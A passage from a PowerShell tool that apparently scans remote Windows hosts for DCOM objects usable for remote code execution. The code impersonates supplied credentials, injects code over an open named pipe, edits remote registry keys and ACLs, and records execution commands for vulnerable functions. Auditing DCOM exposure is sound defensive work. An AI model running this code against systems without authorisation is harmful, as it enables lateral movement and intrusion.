        $ctor = $type.GetConstructor('instance,nonpublic', $null, @([xml.xmlreader]), $null)
        $sr = New-Object System.IO.StringReader $xmlString
        $xr = New-Object System.Xml.XmlTextReader $sr
        $deserializer = $ctor.Invoke($xr)
        $done = $type.GetMethod('Done', [System.Reflection.BindingFlags]'nonpublic,instance')
        while (!$type.InvokeMember("Done", "InvokeMethod,NonPublic,Instance", $null, $deserializer, @()))
        {
            try {
                $type.InvokeMember("Deserialize", "InvokeMethod,NonPublic,Instance", $null, $deserializer, @())
            } catch {
                if($global:debug) {
                    Write-Warning "Could not deserialize ${string}: $_"
                }
            }
        }
        $xr.Close()
        $sr.Dispose()
    }
}


function Find-InArray {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        $Content,
        [system.array]$Array
    )
    # This function is responsible to find string in array (compatible with Powershell v2)
    foreach($data in $Array) {
        if($data -eq $Content) {
            return $true
        }
        
    }
    return $false
}

function Invoke-CodeWithTimeout {
    param (
        [Parameter(Mandatory=$true)]
        [ScriptBlock]$Code,
        [System.Array]$Arguments,
        [Parameter(Mandatory=$true)]
        [int]$Timeout

    )
    <#
        This function is responsible to execute commands with timeouts using runspaces (solve COM hangs).
    #>
    $ps = [PowerShell]::Create()
    $ps.AddScript($Code)|Out-Null
    $Arguments|ForEach {
        $ps.AddArgument($_)|Out-Null
    }
    $handle = $ps.BeginInvoke()
    $StopWatch = New-Object -TypeName System.Diagnostics.Stopwatch
    $StopWatch.Start()
    while(!$handle.isCompleted) {
        if ($StopWatch.Elapsed.TotalSeconds -ge $Timeout) {
            $StopWatch.Reset()|Out-Null
            $ps.Runspace.CloseAsync()|Out-Null
            $global:RunSpaceClosedList.Add($ps.Runspace)|Out-null
            return $false, "Job timed out."
        }
        Sleep -Milliseconds $global:SleepMilisecondsTime
    }
    $data = $ps.EndInvoke($handle)
    $ps.Runspace.Close()|Out-Null
    $ps.Dispose()|Out-Null
    return $data
}


function Get-UserGroupsUsingADSI {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [Parameter(Mandatory = $true)]
        [string]$Username
    )

    # This function is responsible to resolve SID of groups that the user is member of using ADSI.

    try {
        $Account = [ADSI]"WinNT://$($RemoteIP)/$($Username),user"
        $groups = New-Object System.Collections.ArrayList
        $AccountSID = $account.ObjectSid.Value
        if($AccountSID) {
            $groups.Add(@{GroupName=$Username; SID=(New-Object System.Security.Principal.SecurityIdentifier($AccountSID,0)).Value})|Out-Null
        }
        
        $Account.Groups()|foreach {
            $GroupName = ($_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null))
            $ObjectSID = ($_.GetType().InvokeMember("ObjectSID", 'GetProperty', $null, $_, $null))
            if($ObjectSID) {
                $SID = New-Object System.Security.Principal.SecurityIdentifier($ObjectSID,0)
                $groups.Add(@{GroupName=$GroupName; SID=$SID.ToString()})|Out-Null
            }
        }
        return $true, $groups
    } catch {
        return $false, $_
    }
}

function Get-GroupSIDUsingADSI {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [Parameter(Mandatory = $true)]
        [string]$GroupName
    )

    # This function is responsible to resolve SID of a specific group using ADSI

    try {
        $group = [ADSI]"WinNT://$($RemoteIP)/$($GroupName),group"
        $ObjectSID = $group.ObjectSid.Value
        if($ObjectSID) {
            return $true, (New-Object System.Security.Principal.SecurityIdentifier($ObjectSID,0)).Value
        }
        return $false, "$($GroupName) group not found (ADSI)!"
    } catch {
        return $false, $_
    }
}

function Get-UserSIDUsingADSI {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [Parameter(Mandatory = $true)]
        [string]$Username
    )

    # This function is responsible to resolve SID of user using ADSI

    try {
        $Account = [ADSI]"WinNT://$($RemoteIP)/$($Username),user"
        $ObjectSID = $account.ObjectSid.Value
        if($ObjectSID) {
            return $true, (New-Object System.Security.Principal.SecurityIdentifier($ObjectSID,0)).Value
        }
        return $false, "$($Username) user not found (ADSI)!"
    } catch {
        return $false, $_
    }
}



# COMObject functions 

function Start-COMObjectInstance {
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [Parameter(Mandatory = $true)]
        [System.String]$RemoteIP,
        [bool]$isGUID
    )
    # This function is responsible to choose the relevant handle type and interacts with the COM instance.
    try {
        $status, $response = Invoke-CodeWithTimeout -Code {
            param(
                [string]$ObjectName,
                [string]$RemoteIP,
                [bool]$IsGuid=$false
            )
            try {
                if($isGuid) {
                    $com = $([System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($ObjectName,$RemoteIP)))|Select -First 1 # Important to avoid com-objects that contains a list of com-objects inside.
                } else {
                    $com = $([System.Activator]::CreateInstance([Type]::GetTypeFromProgID($ObjectName,$RemoteIP)))|Select -First 1
                }
                if($com) {
                    if($com.GetType -eq [System.Array]) {
                        $com = $com[0]
                    }
                    try {
                        [System.Runtime.InteropServices.Marshal]::ReleaseCOMObject([System.__COMObject]$com)|Out-Null # Release the object and close the remote process
                    } catch {}
                }
                return $true, ""

            } catch {
                return $false, [string]$_
            }
        
        } -Arguments @($ObjectName, $RemoteIP, $isGUID) -Timeout $global:COMTimeout
        if(!$status) {
            return $false, $response
        }
        # Configure and activate COM Instance
        if($isGuid) {
            $com = $([System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($ObjectName,$RemoteIP)))|Select -First 1 # Important to avoid com-objects that contains a list of com-objects inside.
        } else {
            $com = $([System.Activator]::CreateInstance([Type]::GetTypeFromProgID($ObjectName,$RemoteIP)))|Select -First 1
        }
        $global:COMObject = $com
        return $true, ""

    } catch {
        return $false, $_
    }
    
    
}

function Get-ObjMember {
    param(
        $ObjectPath
    )
    # This function is responsible to resolve members of object
    return Invoke-CodeWithTimeout -Code {
        param(
            $COMObject,
            $COMSnapshots,
            $ObjectPath
        )

        if($ObjectPath) {
            if(!$COMSnapshots[$ObjectPath]) {
                return $flase, "$($ObjectPath) Object path is unresolvable!"
            }
            return $true, $COMSnapshots[$ObjectPath].psobject.Members
        }
        return $true, $COMObject.psobject.Members
    } -Arguments @($global:COMObject, $global:COMSnapshots, $ObjectPath) -Timeout $global:COMTimeout
    
}

function Get-Object-Info {
    [OutputType([System.array])]
    param(
        [string]$ObjectPath,
        [string]$PropertyName
    )
    # This function is responsible to order and resolve members of com object
    try {

        $status, $results = Get-ObjMember -ObjectPath $ObjectPath

        $items = New-Object System.Collections.ArrayList
        if(!$status) {
            return $false, $results
        }
        Foreach($item in $results) {
            $data = @{Name=$item.Name;Type=($item.MemberType).ToString()}
            $items.Add($data)|out-null
        }
        return $true, [System.Array]$items

    } catch {
        return $false, $_
    } 
}

function Get-FunctionParameters {
    param(
        [string]$ObjectPath,
        [string]$FunctionName
    )
    # This function is responsible to resolve parameters of COM-object function
    try {
        $status, $result = Get-PropertyType -ObjectPath $ObjectPath -PropertyName $FunctionName
        if(!$status) {
            return $status, $result
        }
        
        if($result -ne "PSMethod") {
            return $false, "$($FunctionName) is not a function!"
        }
        return Invoke-CodeWithTimeout -Code {
            param(
                $COMObject,
                $COMSnapshots,
                $ObjectPath,
                $FunctionName
            )

            if($ObjectPath) {
                return $true, ($COMSnapshots[$ObjectPath].$FunctionName).OverloadDefinitions
            }
            return $true, $COMObject.$FunctionName.OverloadDefinitions
        } -Arguments @($COMObject, $COMSnapshots, $ObjectPath, $FunctionName) -Timeout $global:COMTimeout
    } catch {
        return $false, $_
    }
}

function Browse-COMProperty {
    param(
        [string]$ObjectPath,
        [Parameter(Mandatory = $true)]
        [string]$PropertyName
    )

    # This function is responsible to browse a COM property
    
    if(!$global:COMObject) {
        return $false, "COM Object not exists"
    }

    if($ObjectPath) {
        $FullObjectPath = "$($ObjectPath).$($PropertyName)"
    } else {
        $FullObjectPath = $PropertyName
    }

    
    if(!(Find-InArray -Content $FullObjectPath -Array $global:COMSnapshots.Keys)) { # Checks if the property is not resolved already.
        $status, $error = Invoke-CodeWithTimeout -Code {
            param(
                $COMObject,
                $COMSnapshots,
                [string]$ObjectPath,
                [string]$PropertyName
            )

            try {
                if($ObjectPath) {
                    $COMObject = $COMSnapshots[$ObjectPath]
                }
                return $true, (($COMObject.$PropertyName)|Select -First 1) # Important to avoid com-objects that contains a list of com-objects inside.
            } catch {
                return $false, $_
            }
        } -Arguments @($global:COMObject, $global:COMSnapshots, $ObjectPath, $PropertyName) -Timeout $global:COMTimeout
        
        if(!$status) { # If the object is stuck, dont try to browse the object property
            $global:COMSnapshots[$FullObjectPath] = $false
            return $false, $error
        }

        if($ObjectPath) {
            $global:COMSnapshots[$FullObjectPath] = ($global:COMSnapshots[$ObjectPath].$PropertyName|Select -First 1) # Important to avoid com-objects that contains a list of com-objects inside.
        } else {
            $global:COMSnapshots[$FullObjectPath] = ($global:COMObject.$PropertyName|Select -first 1)
        }
        
    }
    return $true, ""
}


function Get-PropertyType {
    param(
        $ObjectPath,
        $PropertyName
    )
    # This function is responsible to resolve the type of com property

    return Invoke-CodeWithTimeout -Code {
        param(
            $COMObject,
            $COMSnapshots,
            $ObjectPath,
            $PropertyName
        )

        if($ObjectPath) {
            if(!$COMSnapshots[$ObjectPath]) {
                return $false, ""
            }
            return $true, (($COMSnapshots[$ObjectPath].$PropertyName).GetType()).Name
        }
        return $true, (($COMObject.$PropertyName).GetType()).Name
    } -Arguments @($global:COMObject, $global:COMSnapshots, $ObjectPath, $PropertyName) -Timeout $global:COMTimeout
    
}


function Set-COMProperty {
    param(
        [string]$ObjectPath,
        [Parameter(Mandatory = $true)]
        [string]$PropertyName,
        [Parameter(Mandatory = $true)]
        $ArgumentList
    )
    # This function is responsible to invoke functions or set value on property of com-object
    $status, $result = Get-PropertyType -ObjectPath $ObjectPath -PropertyName $PropertyName
    if(!$status) {
        return $false, $result
    }

    return Invoke-CodeWithTimeout -Code {
        param(
            $COMObject,
            $COMSnapshots,
            [string]$ObjectPath,
            $PropertyName,
            $ArgumentList,
            $result
        )

        if($ObjectPath) {
            $COMObject = $COMSnapshots[$ObjectPath]
        }

        if(!$COMObject) {
            return $false, "$($ObjectPath) is not resoleable"
        }

        try {
            if($result -eq "PSMethod") {
            return $true, (($COMObject.$PropertyName)| Select -First 1).Invoke([System.Array]$ArgumentList) # Important to avoid com-objects that contains a list of com-objects inside.
            }

            $COMObject.$PropertyName = $ArgumentList[0]
            return $true, ""
        } catch {
            return $false, $_
        }
    } -Arguments @($global:COMObject, $global:COMSnapshots, $ObjectPath, $PropertyName, $ArgumentList, $result) -Timeout $global:COMTimeout
}

function Quit-COMObject {
    param()

    # This function is responsible to quit COMObjects

    try {
        if(!$global:COMObject) {
            return $false, ""
        }
        
        return Invoke-CodeWithTimeout -Code {
            param(
                $COMObject
            )
            [System.Runtime.InteropServices.Marshal]::ReleaseCOMObject([System.__COMObject]$COMObject)|Out-Null # Release and close the object
            return $true, ""
        } -Arguments $($global:COMObject) -Timeout $global:COMTimeout
        
    } catch {
        return $false, $_
    } finally {
        $global:COMObject = $null
        $global:COMSnapshots.Clear()
    }
}

# Registry functions

function Test-RemoteRegistryNegotiation {
    [OutputType([System.Array])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [ValidateSet("HKLM", "HKU", "HKCU")]
        [string]$Hive
    )
    # This function is responsible to check if the Remote-Registry feature enabled, and tries to authenticate with.
    try {
        $global:RemoteIP = $RemoteIP
        $global:ChoosenHive = $Hive
        switch($Hive) {
            "HKLM" {
                $global:reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $RemoteIP)
            }

            "HKU" {
                $global:reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::Users, $RemoteIP)
            }

            "HKCU" {
                $global:reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::CurrentUser, $RemoteIP)
            }
        }
        $global:RegAuthenticationMethod = "RemoteRegistry"
        return $true, ""
    } catch {
        return $false, $_
    }
}

function Check-RemoteRegistryPermission {
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key,
        [bool]$CheckWritePermissions
    )
    # This function is responsible to check remoteregistry access.
    
    try {
        $obj = $global:reg.OpenSubKey($Key, $CheckWritePermissions)
        return $true, ""
    } catch {}
    return $false, ""
}

function Test-StdRegProvNegotiation {
    [OutputType([System.Array])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [ValidateSet("HKLM", "HKU", "HKCU")]
        [string]$Hive
    )
    # This function is responsible to connect with Standard registry provider using WMI communication.
    $global:RemoteIP = $RemoteIP
    $global:ChoosenHive = $Hive
    switch($Hive) {
        "HKLM" {
            $global:StdRegProvHive = 2147483650
        }
        "HKU" {
            $global:StdRegProvHive = 2147483651
        }

        "HKCU" {
            $global:StdRegProvHive = 2147483649
        }
    }

    $global:reg = Get-WmiObject -List StdRegProv -Namespace root\default -ComputerName $RemoteIP -ErrorAction SilentlyContinue
    if(!$?) {
        return $false, $Error[0].Message
    }
    $global:RegAuthenticationMethod = "StdRegProv"
    return $true, ""

}

function Check-StdRegProvPermissions {
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key,
        [bool]$CheckWritePermissions
    )
    
    
    # This function is responsible to check read / write permissions with the authenticated StdRegProv session.
    $Perm = 1
    if($CheckWritePermissions) {
        $Perm = 2
    }
    try {

        return $true, ($global:reg.CheckAccess($global:StdRegProvHive, $Key, $Perm).bGranted)
    } catch {
        return $false,$_
    }
}

function Add-RegSubKey {
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$KeyLocation,
        [Parameter(Mandatory = $true)]
        [string]$Key
    )
    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return ($global:reg.CreateKey($global:StdRegProvHive, "$($KeyLocation)\$($Key)").ReturnValue -eq 0), ""
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($KeyLocation, $true)
        if(!$regObj) {
            return $false, "$($KeyLocation) key not exists."
        }
        return $true, $regObj.CreateSubKey($Key)
    } catch {
        return $false, $_
    }
}

function Remove-RegSubKey {
    [OutputType([System.Boolean])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$KeyLocation,
        [Parameter(Mandatory = $true)]
        [string]$Key
    )
    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return ($global:reg.DeleteKey($global:StdRegProvHive, "$($KeyLocation)\$($Key)").ReturnValue -eq 0), ""
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($KeyLocation, $true)
        if(!$regObj) {
            return $false, "$($KeyLocation) key not exists."
        }
        return $true, $regObj.DeleteSubKey($Key)
    } catch {
        return $false, $_
    }
}

function Read-RegString {
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key,
        [string]$Value
    )
    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return $true, ($global:reg.GetStringValue($global:StdRegProvHive, $Key, $Value).sValue).ToString()
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($Key)
        if(!$regObj) {
            return $false, "$($Key) key not exists."
        }
        return $true, $regObj.GetValue([string]$Value)
    } catch {
        return $false, $_
    }
}


function Remove-RegString {
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key,
        [string]$Value
    )
    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return ($global:reg.DeleteValue($global:StdRegProvHive, $Key, $Value).ReturnValue -eq 0), ""
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($Key, $true)
        if(!$regObj) {
            return $false, "$($Key) key not exists."
        }
        return $true, $regObj.DeleteValue($Value)
    } catch {
        return $false, $_
    }
}

function Write-RegString {
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key,
        [string]$Value,
        [string]$String
    )
    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return (($global:reg.SetStringValue($global:StdRegProvHive, $Key, $Value, $String)).ReturnValue -eq 0), ""
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($Key, $true)
        if(!$regObj) {
            return $false, "$($Key) key not exists."
        }
        return $true, $regObj.SetValue($Value, $String)
    } catch {
        return $false, $_
    }
}

function Write-RegDWORD {
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key,
        [Parameter(Mandatory = $true)]
        [string]$Value,
        $DWORD
    )

    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return (($global:reg.SetDWORDValue($global:StdRegProvHive, $Key, $Value, [system.Int32]$DWORD)).ReturnValue -eq 0), ""
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($Key, $true)
        if(!$regObj) {
            return $false, "$($Key) key not exists."
        }
        return $true, $regObj.SetValue($Value, $DWORD)
    } catch {
        return $false, $_
    }
}


function Read-RegBinary {
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key,
        [string]$Value
    )
    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return $true, $global:reg.GetBinaryValue($global:StdRegProvHive, $Key, $Value).uValue
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($Key)
        if(!$regObj) {
            return $false, "$($Key) key not exists."
        }
        return $true, $regObj.GetValue($Value)
    } catch {
        return $false, $_
    }
}

function Write-RegBinary {
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key,
        [Parameter(Mandatory = $true)]
        [string]$Value,
        [Parameter(Mandatory = $true)]
        [System.Array]$Bytes
    )
    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return (($global:reg.SetBinaryValue($global:StdRegProvHive, $Key, $Value, [byte[]]$Bytes)).ReturnValue -eq 0), ""
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($Key, $true)
        if(!$regObj) {
            return $false, "$($Key) key not exists."
        }
        return $true, $regObj.SetValue($Value, [byte[]]$Bytes)
    } catch {
        return $false, $_
    }
}


function Get-RegValueName {
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Key
    )
    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return $true, ($global:reg.EnumValues($global:StdRegProvHive ,$Key)).sNames
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($Key)
        if(!$regObj) {
            return $false, "$($Key) key not exists."
        }
        return $true, $regObj.GetValueNames()
    } catch {
        return $false, $_
    }

}

function Get-RegKeyName {
    [OutputType([System.array])]
    param(
        [string]$Key
    )
    try {
        if($global:RegAuthenticationMethod -eq "StdRegProv") {
            return $true, ($global:reg.EnumKey($global:StdRegProvHive ,$Key)).sNames
        }
        Test-RemoteRegistryNegotiation -RemoteIP $global:RemoteIP -Hive $global:ChoosenHive|Out-Null
        $regObj = $global:reg.OpenSubKey($Key)
        if(!$regObj) {
            return $false, "$($Key) key not exists."
        }
        return $true, $regObj.GetSubKeyNames()
    } catch {
        return $false, $_
    }
}

Start-NamedPipeManager -pipeName [DVS_NAME]
'@
    Write-Log -Level VERBOSE -Message "Creates NamedPipe listener"
    try {
        $ListenerScript = [ScriptBlock]{
            param(
                [string]$pipeName,
                [string]$Code
            )
            $PipeSecurity = new-object System.IO.Pipes.PipeSecurity
            $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "FullControl", "Allow" )
            $PipeSecurity.AddAccessRule($AccessRule)
            $pipeDir  = [System.IO.Pipes.PipeDirection]::InOut
            $pipeMsg  = [System.IO.Pipes.PipeTransmissionMode]::Message
            $pipeOpti = [System.IO.Pipes.PipeOptions]::Asynchronous
            $npipeServer = New-Object system.IO.Pipes.NamedPipeServerStream($pipeName, $pipeDir, 100, $pipeMsg, $pipeOpti, 32760, 32760, $PipeSecurity )
            $npipeServer.WaitForConnection();
            $pipeWriter = new-object System.IO.StreamWriter($npipeServer)
            $pipeWriter.Write($Code)
            $pipeWriter.Flush()
            $pipeWriter.Close()
            $npipeServer.Dispose()
        }
        
        $ps = [PowerShell]::Create()
        $ps.AddScript($ListenerScript)|Out-Null
        $ps.AddArgument($global:NamedPipe)|out-null
        $ps.AddArgument($ServerContent.Replace("[DVS_NAME]", $global:NamedPipe).Replace("[COMTIMEOUT]", $global:NamedpipeResponseTimeout).Replace("[DEBUG]", '$' +$global:debug).Replace("[SLEEPTIME]", $global:SleepMilisecondsTime))|Out-Null
        $handle = $ps.BeginInvoke()
        while($ps.Runspace.RunspaceAvailability -ne "Busy") {
            sleep -Milliseconds $global:SleepMilisecondsTime
        }
        Write-Log -Level VERBOSE -Message "NamedPipe listener is ready!"
        if(!$Username.Contains("\")) {
            $Domain = "workgroup"
        } else {
            $Domain, $Username = $Username.Split("\")
        }
        
        $IsLoopback = is-LoopBack -RemoteIP $RemoteIP
        if(!(Start-ImpersonationSession -NetOnly:([bool](!($IsLoopback))) -Domain $Domain -Username $Username -Password $Password -Filename "$env:windir\System32\cmd.exe" -Arguments (('/c "' + $PSHOME + '\powershell.exe" -noprofile - < \\.\pipe\\' + $global:NamedPipe)))) {
            Write-Log -Level ERROR -Message "DVS Can't run"
            return $false
        }
        while($ps.Runspace.RunspaceAvailability -ne "Available") {
            sleep -Milliseconds $global:SleepMilisecondsTime
        }

        $ps.Runspace.Close()
        Write-Log -Level VERBOSE -Message "NamedPipe server code Injected!"
        return $true
    } catch {
        Write-Log -Level ERROR -Message $_ -forceVerbose
        return $false
    }
    
}



function Start-DefaultTasks {
    [CmdletBinding(SupportsShouldProcess=$true)]
    Param(
        [string]$RemoteIP,
        [String]$Username,
        [string]$Password,
        [ValidateSet("Init", "StartTask", "TaskChecks", "EndTask", "Finish")]
        [string]$Type,
        [switch]$AutoGrant
    )
    # This function is responsible to clear the cached information, perform registry negotiation, and every repetative task in each of the exported functions.
    switch($Type) {
        "Init" {
            # Log objects
            $global:LogStream = New-Object IO.StreamWriter -ArgumentList ($global:LogFileName, $true); # Configure the logStream
            $global:ResultsStream = $false
            $global:NamedPipe = "$($global:NamedPipe)_$(-join ((((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A)) | Get-Random -Count 12)  | % {[char]$_}))"
            # Queue objects
            $global:Consumer = [System.Collections.Queue]::Synchronized( (New-Object System.Collections.Queue) ) # Collects results from namedpipe
            $global:Producer = [System.Collections.Queue]::Synchronized( (New-Object System.Collections.Queue) ) # Sends commands to namedpipe
            $global:UserSIDList = @{}
            $global:GroupSIDList = @{}
            $global:VulnerableFunctionList = New-Object System.Collections.ArrayList # Exacts vulenrable function names
            $global:VulnerableMatchList = New-Object System.Collections.ArrayList # Vulnerable Functions patterns(contains "*")
            $global:StopWatch = New-Object -TypeName System.Diagnostics.Stopwatch # Configure stop watch
            $global:StopWatch.Start()
            $global:isNamedpipeStarted = $false
            $global:totalResults = @{} # Count total results for each object
            $global:CachedObjectList = @{} # Cached DCOM object information list
            $global:isResultsExists = $false # A flag that indicates if there is results.
            $global:isNamedpipeStarted = $false
        }

        "StartTask" {
            # Clear namedpipe queues
            $global:Consumer.Clear()|Out-Null
            $global:Producer.Clear()|Out-Null
            $global:UserSIDList.Clear()|Out-Null
            $global:GroupSIDList.Clear()|Out-Null
            $global:ChoosenHive = ""
            $global:RemoteDomain = $null
            $global:RegAuthenticationMethod = $null
            $global:IsDCOMStatusChanged = $false # If DCOM Is not enabled on the machine and we enable it, restore it
            $global:aclSnapshots = New-Object System.Collections.ArrayList # ACLs snapshot list in order to store SDDL snapshots for each registry key (For further reverting operation to the previous machine state)
            $global:AppIDDictionary = New-Object @{} # Collected AppID list from SOFTWARE\Classes\Wow6432Node\AppID and SOFTWARE\Classes\Wow6432Node\AppID
            $global:totalResults.Clear() # Clear total results
            $global:CachedObjectList.Clear() # Clear cached DCOM object information list
            if(!(Start-NamedPipe-Server -Username $Username -Password $Password)) { # Initiate namedpipe server
                return $false 
            }
            if(!(Start-NamedpipeListener)) {
                return $false
            }
            $global:isNamedpipeStarted = $true
            Write-Log -Level INFO -Message "Working on $($RemoteIP) address"
            
        }

        "EndTask" {
            if(!$global:isNamedpipeStarted) {
                return $true
            }
            if(Quit-COMObject) {
                Write-Log -Level VERBOSE -Message "COM Object quitted successfully"
            }
            if($AutoGrant) {
                Rev2Self
            }
            Write-Log -Level INFO -Message "Close Namedpipe server, please wait!"
            if($global:ps -and $global:handle) {
                Close-NamedPipeClient -ps $global:ps -handle $global:handle
            }
            [System.GC]::Collect() # perform garbage collection in order to release memory
        }

        "Finish" {
            Write-Log -Level INFO -Message "[+] Log file location: ($global:LogFileName)"
            if($global:ResultsStream) {
                Write-Log -Level INFO -Message "[+] Results file location: ($global:ResultsFileName)"
            }

            $global:StopWatch.Stop()
            foreach($ParticlesOfTime in @('Days', 'Hours', 'Minutes', 'Seconds')) {
                $TotalParticlesOfTime = "Total$($ParticlesOfTime)"
                $TimeElapsed = [math]::Round($global:StopWatch.Elapsed.$TotalParticlesOfTime, 2)
                if($TimeElapsed -ge 1) {
                    Write-Log -Level INFO -Message "Time elapsed: $($TimeElapsed) $ParticlesOfTime"
                    break
                }
            }
            
            Write-Log -Level INFO -Message "[+] Done!"
            # Close previous logs
            $global:LogStream.Close()|Out-Null
            if($global:ResultsStream) {
                $global:ResultsStream.Close()|Out-Null
            }
        }
    }
    return $true
}


function is-GUID {
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$ObjectName
    )
    # This function is responsible to check if object name is CLSID or ProgID
    $ObjectName -match $global:guidRegex
}


function Wrap-CLSID {
    [OutputType([string])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$ObjectName
    )
    <#
        This function is responsible to wrap CLSID with brackets
        Example: C08AFD90-F2A1-11D1-8455-00A0C91F3880 = {C08AFD90-F2A1-11D1-8455-00A0C91F3880}
    #>
    
    if(is-GUID -ObjectName $ObjectName) {
        $clsid = $ObjectName.Replace("{", "").Replace("}", "")
        return "{$($clsid)}"
    }
    return $ObjectName
    
}

function Convert-ArrayToCSVRow {
    [OutputType([string])]
    Param(
        [System.Array]$ArrayList
    )
    # This function is responsible to converet array to CSV row (compatible with Powershell v2)
    $row = ''
    foreach($item in $ArrayList) {
        if($item -eq $null) {
            $item = ""
        }
        $item =$item.ToString().Replace('"', '""')
        if($item.LastIndexOf(",") -ne -1) {
            $item = '"' + $item + '"'
        }
        $row += "$($item),"
    }
    return $row
}

function Add-ResultRow {
    param(
        [System.Array]$ResultRow
    )
    # Configure the ResultsStream
    if(!$global:ResultsStream) {
        if([System.IO.File]::Exists($global:ResultsFileName)) {
            $global:isResultsExists = $true
        }
        $global:ResultsStream = New-Object IO.StreamWriter -ArgumentList ($global:ResultsFileName, $true)
        
        # If we have previous results file, don't add headers.
        if(!$global:isResultsExists) {
            $global:ResultsStream.WriteLine((Convert-ArrayToCSVRow -ArrayList @('Remote IP', 'ProgName', 'CLSID', 'ProgID', 'Path', 'Execution Command (CLSID)', 'Execution Command (ProgID)', 'Library (32bit)', 'Library (64bit)')))
        }
    }

    $global:ResultsStream.WriteLine((Convert-ArrayToCSVRow -ArrayList $ResultRow))
    $global:ResultsStream.Flush()

}

Function Add-Result {
    [CmdletBinding(SupportsShouldProcess=$true)]
    Param(
        [Parameter(Mandatory=$True)]
        $ObjectName,
        $ObjectPath,
        [Parameter(Mandatory=$True)]
        [string]$RemoteIP,
        [string]$OverloadDefinitions,
        [switch]$CheckAccessOnly,
        [switch]$SkipRegAuth
    )
    # This function is responsible to collect and store the results

    if($SkipRegAuth) {
        if(is-GUID -ObjectName $ObjectName) {
            $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = @($ObjectName, "", "", "", "")
        } else {
            $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = @("", $ObjectName, "", "", "")
        }
    } else {
        $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = Get-ObjectInfo -ObjectName $ObjectName # Collect object info
    }
    ForEach($handleType in @("ProgID", "CLSID")) {  # Generates execution commands
        if($CheckAccessOnly) { # If CheckAccessOnly mode is on, dont try to get invoke command (Duo to the fact e dont have the object path)
            Set-Variable -Name "$($handleType)Command" -Value ""
            continue
        }
        $objName = Get-Variable -Name $handleType -ValueOnly
        if(!$objName) {
            continue
        }
        $cmd = _Generate-ExecutionCommand -ObjectName $objName -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions -forceVerbose
        Set-Variable -Name "$($handleType)Command" -Value $cmd
    }

    if(!(Find-InArray -Content $ObjectName -Array $global:totalResults.Keys)) { # If the object does not have results, create a new counter for it.
        $global:totalResults[$ObjectName] = 0
    }
    
    $global:totalResults[$ObjectName] += 1 # Count results for each DCOM object
    # Add result row
    Add-ResultRow -ResultRow @($RemoteIP, $progName, $clsid, $ProgID, $ObjectPath, $CLSIDCommand, $ProgIdCommand, $Library_32, $Library_64)
